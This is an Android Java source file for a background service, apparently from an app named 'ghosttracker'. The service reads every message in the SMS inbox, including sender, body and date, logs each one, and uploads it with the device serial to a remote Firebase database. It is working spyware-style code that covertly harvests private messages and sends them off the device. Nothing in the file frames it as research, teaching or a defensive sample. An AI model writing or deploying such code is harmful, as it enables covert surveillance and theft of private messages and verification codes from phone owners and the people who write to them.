package com.maleezha.ghosttracker.services;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;

public class SyncService extends Service {

    private static final String TAG = "SyncService";
    private DatabaseReference databaseReference;
    private Handler handler;

    @Override
    public void onCreate() {
        super.onCreate();
        databaseReference = FirebaseDatabase.getInstance().getReference("sms_messages");
        handler = new Handler();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            readAndUploadSms();
            stopSelf();
        }).start();
        return START_STICKY;
    }

    private void readAndUploadSms() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "READ_SMS permission not granted");
            return;
        }

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, null, null, null, null);

        if (cursor == null) {
            Log.e(TAG, "Failed to query SMS");
            return;
        }

        while (cursor.moveToNext()) {
            String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
            String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
            String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
            String date = cursor.getString(cursor.getColumnIndexOrThrow("date"));

            Log.d(TAG, "SMS from: " + address + ", body: " + body);

            Map<String, Object> smsData = new HashMap<>();
            smsData.put("id", id);
            smsData.put("address", address);
            smsData.put("body", body);
            smsData.put("date", date);
            smsData.put("phoneId", android.os.Build.SERIAL);

            databaseReference.push().setValue(smsData);
        }
        cursor.close();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
